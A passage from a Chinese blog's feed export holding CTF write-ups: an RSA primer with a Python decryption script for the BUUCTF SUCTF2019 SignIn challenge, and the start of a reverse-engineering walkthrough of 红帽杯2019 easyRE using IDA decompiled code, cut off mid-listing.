class="line"></span><br><span class="line">EQ3:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq 24(%rdi), %r13</span><br><span class="line">    rmmovq %r13, 24(%rsi)</span><br><span class="line">    andq %r13, %r13</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1, %rax</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/11/2ZdkDcsWQiEqRIx.png" alt="archlab_PartC_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA解密</title>
      <link href="/2021/05/08/RSA/"/>
      <url>/2021/05/08/RSA/</url>
      
        <content type="html"><![CDATA[<p><code>RSA</code>解密简介:<code>RSA</code>是1977年由罗纳德·李维斯特（<code>Ron Rivest</code>）、阿迪·萨莫尔（<code>Adi Shamir</code>）和伦纳德·阿德曼（<code>Leonard Adleman</code>）一起提出的。当时他们三人都在麻省理工学院工作。<code>RSA</code>就是他们三人姓氏开头字母拼在一起组成的 。(from 百度百科)</p><span id="more"></span><h1 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h1><p>我们平时学习的加密多是对称加密，非对称加密相比于对称加密的区别就是:加密和解密用的不是同一个密钥。假如<code>Alice</code>和Bob想在一个不安全的线路上通信，他们在用这个信息交流之前没有任何py的信息(即:他们一开始不存在有且仅有他们两个人知道的信息)，而在这条线路上通信的所有信息都会被第三方窃听者Eve所获得。问:如何不让窃听者Eve监听到<code>Alice</code>和Bob的对话？</p><p>当然我们必须对发送的信息进行加密，而对称加密必须两人提前获取密钥和加密方式，这些信息都是他们一开始所不知道的，因此需要在这条线路上告知密钥和加密方式，如果在这条线路上告知，那么Eve也能对加密的数据解密从而监听他们的通话内容，那么我们采取非对称加密是最保险的。我只告诉你怎么加密，解密的密钥我自己留着，由于Eve不清楚解密方式自然就无法获取信息了。</p><h1 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h1><p>首先选取两个很大的质数<code>p</code>,<code>q</code>。</p><p>令<code>n=p*q</code>，任意选取一个很大的质数做公钥指数，那么<code>(n,e)</code>就形成了公钥，可以用它进行加密，假如明文为m，那么密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">c=m^e mod n</span><br></pre></td></tr></table></figure><p>我自己生成的p,q做运算<code>φ(n)=(p-1)(q-1)</code></p><p><code>d=inverse(e,φ(n))</code>，<code>inverse</code>函数为求模逆元函数</p><p><code>(n,d)</code>就是私钥，是只有我们自己知道的。</p><p>我拿到密文c后我可以用d还原明文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">m=c^d mod n</span><br></pre></td></tr></table></figure><h1 id="RSA加密的破解"><a href="#RSA加密的破解" class="headerlink" title="RSA加密的破解"></a>RSA加密的破解</h1><p>破解的关键在于分解n的质因数，如果分解得到的p,q那么我们就很容易推得私钥d。</p><p>在应用当中，n一般有2048位，基本是破解不出的，而在比赛的时候n就只有不到百位，用一些在线工具也是很快可以破解得到p和q的。</p><p>但是拿到了一个很大位数的私钥d那也不顶用啊，算还是算不了啊，这个时候可以用第三方解密包RSA，也可以手写算法解决，作为一个ACMer，就得把珍藏已久的快速幂算法拿出来了，由于python支持大数，所以我会用python写。</p><h1 id="例题-SUCTF2019-SignIn"><a href="#例题-SUCTF2019-SignIn" class="headerlink" title="例题:[SUCTF2019]SignIn"></a>例题:[<a href="https://buuoj.cn/challenges#[SUCTF2019]SignIn">SUCTF2019]SignIn</a></h1><p>拿到elf文件先拖进IDA打开字符串窗口<code>(shift+F12)</code>，发现很容易看到字符串<code>[input flag]</code>，那么跟进去找到函数<code>main()</code></p><p><img src="https://i.loli.net/2021/05/07/q6bVAWsiu2m3SgT.png" alt="buuctf SignIn_1.png"></p><p>发现多了很多不认识的函数，但是根据它的参数也可以很容易发现这是个字符串赋值的函数，而且后面加了参数<code>10</code>或者<code>16</code>很像它的进制。后面的<code>GG</code>和<code>TTTTTTql!</code>肯定就是判断你输入的flag的正误了。</p><p>从头开始分析，输入的是v8字符串，v8经过了sub_96A函数的洗礼，跟进去看看逻辑关系。</p><p><img src="https://i.loli.net/2021/05/07/gmD4cXz23kZLVft.png" alt="buuctf SignIn_2.png"></p><p>很容易发现它是把a1字符串拆解成高字节和低字节分别存储到a2[i]和a2[i+1]，至于字符串byte_202010那就是很典型的16进制表<code>0123456789abcdef</code>，那么我输入的它给它拆成16进制数了，那么等会逆向解回去的话这个还是很好逆回去的，那么我们<code>ESC</code>跳回原来的函数。</p><p>v8的值转换给了v9，v7为下面比较字符串的其中一个，然后把v9转换成16进制数赋给v6，v5=65537。其实这个特征都就已经告诉你这是RSA解密。毕竟加密指数65537是十分常见的RSA加密指数。那么下面还有一个不认识的函数，不过看它的后缀powm，pow你就很容易看出来是取次方，然后m不就是模mod了么(手动滑稽)。所以这个函数实现的功能等价于一个表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v6=v6^v5%v4</span><br></pre></td></tr></table></figure><p>相当于v6是我们输入的，然后这个结果我们是知道的，模数n和指数e我们也知道，那么就对它结果(v7)进行RSA解密。</p><p>1.破解得到p,q，<a href="http://www.factordb.com/index.php">在线工具</a></p><p>2.编写脚本解密，这里用第三方包解密我就不演示了，主要看看解密的过程。</p><p>脚本中的数一律为10进制，转换的简单方法:把数复制到python交互窗口加上前缀<code>0x</code>就可以输出它的10进制数值了。</p><p><img src="https://i.loli.net/2021/05/07/nAc9TG5p4hDgrLq.png" alt="buuctf SignIn_3.png"></p><p>快速幂的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">while(d):</span><br><span class="line">    if d&amp;1:</span><br><span class="line">        x=x*c%n</span><br><span class="line">    c=c*c%n</span><br><span class="line">    d=d//2</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>得到数值<code>185534734614696481020381637136165435809958101675798337848243069</code>。</p><p>这里还要转回16进制再被逆回去处理，因为它以开始也就是16进制的，我们还用python<code>hex(185534734614696481020381637136165435809958101675798337848243069)</code>得到16进制数。</p><p><img src="https://i.loli.net/2021/05/07/IzF89jYiTCL6bdp.png" alt="buuctf SignIn_4.png"></p><p>最后一步就可以写脚本做最后一步解密了，这一步很简单，就是16进制转字符串，这个我喜欢用C++写，我感觉会比较方便。</p><p><img src="https://i.loli.net/2021/05/07/OMTJFghtDpBrKan.png" alt="buuctf SignIn_5.png"></p><p>得到flag</p><p>本篇所有的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">#RSA解密脚本</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">p=282164587459512124844245113950593348271</span><br><span class="line">q=366669102002966856876605669837014229419</span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">e=65537</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">c=78510953323073667749065685964447569045476327122134491251061064910992472210485</span><br><span class="line">n=103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line">x=1</span><br><span class="line">while(d):</span><br><span class="line">    if d&amp;1:</span><br><span class="line">        x=x*c%n</span><br><span class="line">    c=c*c%n</span><br><span class="line">    d=d//2</span><br><span class="line">print(x)</span><br><span class="line">c++</span><br><span class="line"></span><br><span class="line">//hex2raw脚本</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">//char s[100];</span><br><span class="line">char s[]=&quot;73756374667b50776e5f405f68756e647265645f79656172737d&quot;;</span><br><span class="line">int b=0;</span><br><span class="line">int main()&#123;</span><br><span class="line">    for(int i=0;i&lt;strlen(s);i+=2)&#123;</span><br><span class="line">        int x=0;</span><br><span class="line">        if(s[i]&lt;=&#x27;9&#x27;)&#123;</span><br><span class="line">            x=(s[i]-&#x27;0&#x27;)&lt;&lt;4;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            x=(s[i]-&#x27;a&#x27;+10)&lt;&lt;4;</span><br><span class="line">        &#125;</span><br><span class="line">        if(s[i+1]&lt;=&#x27;9&#x27;)&#123;</span><br><span class="line">            x+=(s[i+1]-&#x27;0&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            x+=(s[i+1]-&#x27;a&#x27;+10);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;%c&quot;,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本作者也是没想到啊，学逆向要把加密看那么透的，当时学RSA偷懒了啊，所以导致昨天捡起又花了很多时间，不过也好，加深了我对RSA算法的印象。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红帽杯2019 easyRe</title>
      <link href="/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/"/>
      <url>/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/</url>
      
        <content type="html"><![CDATA[<p><code>pwn</code>题做完<code>re</code>题当然也不能少，<code>buu</code>上除了那些水题，开始做一些带点技术含量的题目了。</p><span id="more"></span><p>红帽杯2019的<code>easyRE</code>上来就是<code>800KB</code>的<code>elf</code>文件，看起来就很有技术含量的样子。其实看到大文件不用怕，函数多也不用怕，因为需要分析的函数一定只有几个，如果你点进去调用了大部分你没见过的函数，还有十分复杂的<code>goto</code>关系，那么这个函数你可以直接当他不存在，这是我自己得到的一个结论，不一定对，但是可以应付大部分的题目。废话不多说进入正题：<a href="https://buuoj.cn/challenges#[2019%E7%BA%A2%E5%B8%BD%E6%9D%AF]easyRE">buuctf 2019红帽杯easyRE</a></p><p>所有二进制安全相关的题目字符串一定是切入点，因为它可读。做<code>pwn</code>题你就找<code>flag</code>，<code>bin/sh</code>，当然这是签到-难度的题目才会有的字符串。做逆向题的话，看到很长的64位或者65位大小写字母和数字和一些其它字符组成的表，那么直接考虑<code>base64</code>，然后就是一些带<code>flag</code>的字符串或者是什么<code>right</code>，<code>correct</code>，<code>congratulate</code>之类判断正误的话，那么多半也是以调用这个字符串的函数为中心去分析。好的，打开先看一下，看到有很多很多的函数，先不慌(实则慌的一批)，冷静地先摁一个<code>shift+F12</code>查看字符串。</p><p><img src="https://i.loli.net/2021/05/06/5bQk79uOfiWDAea.png" alt="buuoj 红帽杯2019 easyRE_1.png"></p><p>一眼就可以看道有一个经典的<code>base64</code>表，还有一句话<code>you found me</code>(你找到我了)，像极了<code>flag</code>跟我们的对话，那么话不多说，点进去找到这个函数看看到底在哪里发出了这样的感叹。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_424BA0(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">unsigned</span> __int64)sub_424BA0(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    sub_4406E0(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到这个函数之后就是以这个为主去分析了，由于这个函数特别不友好，我们得去看看这个函数调用的其它那么多sub函数有没有我们认识的熟悉的函数。其实第一点很容易可以看出<code>sub_410CC00</code>非常像输出一句话，也就是<code>puts</code>函数，当然把它理解为<code>printf</code>也没有关系，不影响。根据代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br></pre></td></tr></table></figure><p>函数参数为字符指针，返回一个数值，是不是像极了strlen函数？</p><p><code>sub_4406E0(0LL, v15, 37LL);</code>这个函数，第一个参数0，第二个参数，字符指针，第三个参数一个整型变量，其实也不难判断出是<code>read</code>函数，这个靠自己积累多了，看道这种形式就知道是这个函数。这么讲有些人可能懵懵的，那我这么说，<code>sub_4105A6(&quot;%d%d&quot;,&amp;v1,&amp;v2)</code>是什么函数？你会很快看出这就是一个<code>scanf</code>，除了<code>scanf</code>还有哪个函数写得出这种形式啊？喏，道理一样的。那么我们把那些函数重命名回去看看整体观感好了不少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  read(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">unsigned</span> __int64)<span class="built_in">strlen</span>(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你会突然自言自语，”这两个是一个函数？“，不要慌，小场面，小场面。那么这么之后就看看主要的内容，首先一个<code>for</code>循环映入眼帘，发现我们输入的<code>v15[i]^i</code>如果不等于<code>v12[i]</code>那么就会直接跳到最后一行结束程序，那么我们肯定要看看不让它跳转的输入语句是个什么。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 